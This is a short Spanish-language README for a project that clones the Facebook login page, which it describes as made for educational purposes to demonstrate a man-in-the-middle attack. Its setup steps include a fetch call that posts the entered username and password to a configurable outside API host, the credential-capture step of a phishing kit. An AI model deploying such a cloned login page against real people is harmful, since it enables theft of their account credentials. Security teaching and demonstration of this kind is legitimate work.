# Inicar

- Clonar repositorio

``` sh
  git clone https://github.com/Miguel-r-dev/fb-clone-mitm.git
```

- Instalar dependencias

```sh
  npm install 
```

- Modificar la url **http://localhost:3000/login** en la linea 11 del archivo **MainView.jsx**, por la ip o url donde se esté ejecutando la API

```sh
  await fetch('http://ip-api:3000/login', { 
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({username: user, password: pass}),
      });
```

- Iniciar el proyecto

```sh
  npm run dev 
```

## Importante

Este es un clon del login de facebook creado con fines educativos para la demostración de un ataque MITM.
